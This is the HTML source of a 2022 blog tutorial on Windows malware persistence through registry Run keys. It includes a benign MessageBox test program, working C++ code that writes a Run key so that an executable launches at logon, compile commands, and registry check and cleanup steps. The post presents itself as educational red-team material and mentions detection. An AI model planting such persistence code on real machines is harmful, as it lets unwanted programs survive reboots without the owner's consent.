@@ -1,0 +1,827 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Malware development: persistence - part 1. Registry run keys. C++ example. - cocomelonc</title>
+<meta name="description" content="﷽">
+
+
+  <meta name="author" content="cocomelonc">
+  
+  <meta property="article:author" content="cocomelonc">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="cocomelonc">
+<meta property="og:title" content="Malware development: persistence - part 1. Registry run keys. C++ example.">
+<meta property="og:url" content="https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html">
+
+
+  <meta property="og:description" content="﷽">
+
+
+
+  <meta property="og:image" content="https://cocomelonc.github.io/assets/images/51/2022-04-20_09-43.png">
+
+
+
+  <meta name="twitter:site" content="@cocomelonc">
+  <meta name="twitter:title" content="Malware development: persistence - part 1. Registry run keys. C++ example.">
+  <meta name="twitter:description" content="﷽">
+  <meta name="twitter:url" content="https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://cocomelonc.github.io/assets/images/51/2022-04-20_09-43.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2022-04-20T04:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "cocomelonc",
+      "url": "https://cocomelonc.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="cocomelonc Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          cocomelonc
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">about</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://cocomelonc.github.io/">
+        <img src="/assets/images/cat.png" alt="cocomelonc" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://cocomelonc.github.io/" itemprop="url">cocomelonc</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>cybersec enthusiast. CTF player</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:cocomelonkz@gmail.com" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/cocomelonckz" rel="nofollow noopener noreferrer me"><i class="fab fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.hackthebox.eu/profile/293150" rel="nofollow noopener noreferrer me"><i class="far fa-flag" aria-hidden="true"></i><span class="label">HackTheBox</span></a></li>
+          
+        
+          
+            <li><a href="https://tryhackme.com/p/cocomelonc" rel="nofollow noopener noreferrer me"><i class="far fa-flag" aria-hidden="true"></i><span class="label">TryHackMe</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/cocomelonc/" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/" rel="nofollow noopener noreferrer me"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Malware development: persistence - part 1. Registry run keys. C++ example.">
+    <meta itemprop="description" content="﷽">
+    <meta itemprop="datePublished" content="2022-04-20T04:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html" class="u-url" itemprop="url">Malware development: persistence - part 1. Registry run keys. C++ example.
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>﷽</p>
+
+<p>Hello, cybersecurity enthusiasts and white hackers!</p>
+
+<p><img src="/assets/images/51/2022-04-20_09-43.png" alt="pers" class="img-responsive" /></p>
+
+<p>This post starts a series of articles on windows malware persistence techniques and tricks.</p>
+
+<p>Today I’ll write about the result of my own research into the “classic” persistence trick: startup folder registry keys.</p>
+
+<h3 id="run-keys">run keys</h3>
+
+<p>Adding an entry to the “run keys” in the registry will cause the app referenced to be executed when a user logs in. These apps will be executed under the context of the user and will have the account’s associated permissions level.</p>
+
+<p>The following run keys are created by default on Windows Systems:</p>
+
+<p><code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>  <br />
+<img src="/assets/images/51/2022-04-20_18-57.png" alt="pers" class="img-responsive" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>  <br />
+<img src="/assets/images/51/2022-04-20_18-58.png" alt="pers" class="img-responsive" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>  <br />
+<img src="/assets/images/51/2022-04-20_18-59.png" alt="pers" class="img-responsive" /></p>
+
+<blockquote>
+  <p>Please note that this suggests to another trick to anti-VM (VirtualBox)</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>  <br />
+<img src="/assets/images/51/2022-04-20_18-59_1.png" alt="pers" class="img-responsive" /></p>
+
+<p>Threat actors can use these configuration locations to execute malware to maintain persistence through system reboots. Threat actors may also use masquerading to make the registry entries look as if they are associated with legitimate programs.</p>
+
+<h3 id="practical-example">practical example</h3>
+
+<p>Let’s go to look at a practical example. Let’s say we have a <em>“malware”</em> <code class="language-plaintext highlighter-rouge">hack.cpp</code>:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+meow-meow messagebox
+author: @cocomelonc
+*/</span>
+<span class="cp">#include &lt;windows.h&gt;
+</span>
+<span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hPrevInstance</span><span class="p">,</span> <span class="n">LPSTR</span> <span class="n">lpCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nCmdShow</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">MessageBoxA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"Meow-meow!"</span><span class="p">,</span><span class="s">"=^..^="</span><span class="p">,</span> <span class="n">MB_OK</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s go to compile it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x86_64-w64-mingw32-g++ <span class="nt">-O2</span> hack.cpp <span class="nt">-o</span> hack.exe <span class="nt">-mwindows</span> <span class="nt">-I</span>/usr/share/mingw-w64/include/ <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="nt">-fpermissive</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/51/2022-04-20_19-08.png" alt="pers" class="img-responsive" /></p>
+
+<p>And save it to folder <code class="language-plaintext highlighter-rouge">Z:\\2022-04-20-malware-pers-1\</code>:</p>
+
+<p><img src="/assets/images/51/2022-04-20_19-10.png" alt="pers" class="img-responsive" /></p>
+
+<p>Then, let’s create a script <code class="language-plaintext highlighter-rouge">pers.cpp</code> that creates registry keys that will execute our program <code class="language-plaintext highlighter-rouge">hack.exe</code> when we log into Windows:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+pers.cpp
+windows low level persistense via start folder registry key
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html
+*/</span>
+<span class="cp">#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+  <span class="n">HKEY</span> <span class="n">hkey</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="c1">// malicious app</span>
+  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">exe</span> <span class="o">=</span> <span class="s">"Z:</span><span class="se">\\</span><span class="s">2022-04-20-malware-pers-1</span><span class="se">\\</span><span class="s">hack.exe"</span><span class="p">;</span>
+
+  <span class="c1">// startup</span>
+  <span class="n">LONG</span> <span class="n">res</span> <span class="o">=</span> <span class="n">RegOpenKeyEx</span><span class="p">(</span><span class="n">HKEY_CURRENT_USER</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="s">"SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Run"</span><span class="p">,</span> <span class="mi">0</span> <span class="p">,</span> <span class="n">KEY_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hkey</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// create new registry key</span>
+    <span class="n">RegSetValueEx</span><span class="p">(</span><span class="n">hkey</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="s">"hack"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">exe</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">exe</span><span class="p">));</span>
+    <span class="n">RegCloseKey</span><span class="p">(</span><span class="n">hkey</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As you can see, logic is simplest one. We just add new registry key. Registry keys can be added from the terminal to the run keys to achieve persistence, but since I love to write code, I wanted to show how to do it with some lines of code.</p>
+
+<h3 id="demo">demo</h3>
+
+<p>Let’s compile our <code class="language-plaintext highlighter-rouge">pers.cpp</code> script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x86_64-w64-mingw32-g++ <span class="nt">-O2</span> pers.cpp <span class="nt">-o</span> pers.exe <span class="nt">-I</span>/usr/share/mingw-w64/include/ <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="nt">-fpermissive</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/51/2022-04-20_19-20.png" alt="pers" class="img-responsive" /></p>
+
+<p>Then, first of all, check registry keys in the victim’s machine:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="w"> </span><span class="nx">/s</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/51/2022-04-20_09-35.png" alt="pers" class="img-responsive" /></p>
+
+<p>Then, run our <code class="language-plaintext highlighter-rouge">pers.exe</code> script and check again:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\pers.exe</span><span class="w">
+</span><span class="nx">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="w"> </span><span class="nx">/s</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/51/2022-04-20_09-39.png" alt="pers" class="img-responsive" /></p>
+
+<p>As you can see, new key added as expected.  <br />
+So now, check everything in action. Logout and login again:</p>
+
+<p><img src="/assets/images/51/2022-04-20_09-40.png" alt="pers" class="img-responsive" /></p>
+
+<p><img src="/assets/images/51/2022-04-20_09-40_1.png" alt="pers" class="img-responsive" /></p>
+
+<p><img src="/assets/images/51/2022-04-20_09-44.png" alt="pers" class="img-responsive" /></p>
+
+<p>Pwn! Everything is worked perfectly :)</p>
+
+<p>After the end of the experiment, delete the keys:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Remove-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"hack"</span><span class="w">
+</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="w"> </span><span class="nx">/s</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/51/2022-04-20_09-46.png" alt="pers" class="img-responsive" /></p>
+
+<h3 id="windows-11">windows 11</h3>
+
+<p>This trick is also work on <code class="language-plaintext highlighter-rouge">Windows 11</code>:</p>
+
+<p><img src="/assets/images/51/2022-04-21_10-29.png" alt="pers" class="img-responsive" /></p>
+
+<p><img src="/assets/images/51/2022-04-21_10-30.png" alt="pers" class="img-responsive" /></p>
+
+<p><img src="/assets/images/51/2022-04-21_10-30_1.png" alt="pers" class="img-responsive" /></p>
+
+<p><img src="/assets/images/51/2022-04-21_10-30_2.png" alt="pers" class="img-responsive" /></p>
+
+<p><img src="/assets/images/51/2022-04-21_10-31.png" alt="pers" class="img-responsive" /></p>
+
+<p>And cleanup:</p>
+
+<p><img src="/assets/images/51/2022-04-21_10-32.png" alt="pers" class="img-responsive" /></p>
+
+<h3 id="conclusion">conclusion</h3>
+
+<p>Creating registry keys that will execute an malicious app during Windows logon is one of the oldest tricks in the red team playbooks. Various threat actors and known tools such as Metasploit, Powershell Empire provide this capability therefore a mature blue team specialists will be able to detect this malicious activity.</p>
+
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa">RegOpenKeyEx</a>  <br />
+<a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa">RegSetValueEx</a>  <br />
+<a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey">RegCloseKey</a>  <br />
+<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/remove-itemproperty?view=powershell-7.2">Remove-ItemProperty</a>  <br />
+<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query">reg query</a>  <br />
+<a href="https://github.com/cocomelonc/meow/tree/master/2022-04-20-malware-pers-1">source code in github</a></p>
+
+<blockquote>
+  <p>This is a practical case for educational purposes only.</p>
+</blockquote>
+
+<p>Thanks for your time happy hacking and good bye! <br />
+<em>PS. All drawings and screenshots are mine</em></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#malware" class="page__taxonomy-item p-category" rel="tag">malware</a><span class="sep">, </span>
+    
+      <a href="/tags/#persistence" class="page__taxonomy-item p-category" rel="tag">persistence</a><span class="sep">, </span>
+    
+      <a href="/tags/#red-team" class="page__taxonomy-item p-category" rel="tag">red team</a><span class="sep">, </span>
+    
+      <a href="/tags/#win32api" class="page__taxonomy-item p-category" rel="tag">win32api</a><span class="sep">, </span>
+    
+      <a href="/tags/#windows" class="page__taxonomy-item p-category" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#tutorial" class="page__taxonomy-item p-category" rel="tag">tutorial</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2022-04-20T04:00:00+00:00">April 20, 2022</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=cocomelonc&text=Malware+development%3A+persistence+-+part+1.+Registry+run+keys.+C%2B%2B+example.%20https%3A%2F%2Fcocomelonc.github.io%2Ftutorial%2F2022%2F04%2F20%2Fmalware-pers-1.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcocomelonc.github.io%2Ftutorial%2F2022%2F04%2F20%2Fmalware-pers-1.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fcocomelonc.github.io%2Ftutorial%2F2022%2F04%2F20%2Fmalware-pers-1.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/tutorial/2022/04/15/malware-injection-19.html" class="pagination--pager" title="Malware development tricks. Download and inject logic. C++ example.
+">Previous</a>
+    
+    
+      <a href="/tutorial/2022/04/26/malware-pers-2.html" class="pagination--pager" title="Malware development: persistence - part 2. Screensaver hijack. C++ example.
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/114/2023-12-26_23-10.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/malware/2023/12/25/malware-cryptography-23.html" rel="permalink">Malware and cryptography 23: encrypt/decrypt file via TEA. Simple C/C++ example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/113/2023-12-13_11-49.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/book/2023/12/13/malwild-book.html" rel="permalink">Malware in the wild book.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/112/2023-12-11_01-01_1.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/persistence/2023/12/10/malware-pers-23.html" rel="permalink">Malware development: persistence - part 23. LNK files. Simple Powershell example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/111/2023-11-29_23-27.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/malware/2023/11/23/malware-cryptography-22.html" rel="permalink">Malware and cryptography 22: encrypt/decrypt payload via XTEA. Simple C++ example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/cocomelonckz" rel="nofollow noopener noreferrer"><i class="fab fa-twitter" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://www.hackthebox.eu/profile/293150" rel="nofollow noopener noreferrer"><i class="far fa-flag" aria-hidden="true"></i> HackTheBox</a></li>
+        
+      
+        
+          <li><a href="https://tryhackme.com/p/cocomelonc" rel="nofollow noopener noreferrer"><i class="far fa-flag" aria-hidden="true"></i> TryHackMe</a></li>
+        
+      
+        
+          <li><a href="https://github.com/cocomelonc/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 cocomelonc. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
